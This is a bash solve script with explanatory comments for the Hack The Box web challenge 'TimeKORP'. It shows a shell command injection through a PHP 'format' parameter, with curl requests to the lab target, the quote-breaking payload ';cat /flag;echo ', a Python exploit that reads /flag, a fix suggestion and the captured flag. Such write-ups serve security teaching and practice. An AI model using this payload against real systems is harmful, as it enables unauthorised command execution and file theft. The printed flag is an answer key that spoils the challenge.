#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: TimeKORP
# Category: Web
# Platform: Hack The Box
#
# Description:
# The application is a small web page that renders the current time or date
# based on a `format` query parameter.
#
# Provided file:
# web_timecorp.zip
#
# Spawned target used during solving:
# http://154.57.164.80:31558
#
# Core lesson:
# User input is passed directly into a shell command:
# date '+<format>' 2>&1
#
# That is command injection because the format is wrapped in single quotes.
# If we supply our own single quote, we can terminate the intended string,
# execute arbitrary shell commands, and then reopen the quote so the command
# line remains syntactically valid.
#
# Vulnerable code path:
# models/TimeModel.php
#
#   $this->command = "date '+" . $format . "' 2>&1";
#   $time = exec($this->command);
#
# Step 1: Read the source code.
# Manual command:
# sed -n '1,220p' challenge/models/TimeModel.php
#
# Reason:
# This reveals the exact shell command construction and explains why normal
# metacharacters like `;` do not work by themselves until we first break out of
# the surrounding single-quoted string.
#
# Step 2: Confirm the live app uses the format parameter.
# Manual command:
# curl -s 'http://154.57.164.80:31558/?format=%25H:%25M:%25S'
#
# Reason:
# The homepage prints the result of the `date` command in the page body.
# That reflected output becomes our exfiltration channel.
#
# Step 3: Break out of the quoted date format and read the flag.
# Manual command:
# curl -s 'http://154.57.164.80:31558/?format=%27%3Bcat%20/flag%3Becho%20%27'
#
# Decoded payload:
# ';cat /flag;echo '
#
# Why this works:
# The final shell command becomes roughly:
# date '+';cat /flag;echo '' 2>&1
#
# Which means:
# - date '+' runs first
# - cat /flag runs next
# - echo '' cleans up the trailing quote context
#
# The application then captures the last command output and renders it in:
# "It's <output>."
#
# Real-world concept:
# This is a classic shell injection pattern caused by:
# - string concatenation into a shell command
# - assuming quoting alone is enough protection
#
# The safe fix is to avoid shell execution entirely and use direct language
# APIs for time formatting, or at minimum pass arguments safely without invoking
# a shell.
#
# Flag obtained:
# HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_a2f2562f0a75125017435e5edf882a5f}

host="${1:-154.57.164.80}"
port="${2:-31558}"

python3 - "$host" "$port" <<'PY'
import re
import sys

import requests

host = sys.argv[1]
port = sys.argv[2]
base = f"http://{host}:{port}/"

payload = "';cat /flag;echo '"
r = requests.get(base, params={"format": payload}, timeout=15)

match = re.search(r"HTB\{[^}]+\}", r.text)
if not match:
    raise SystemExit(r.text)

print(match.group(0))
PY
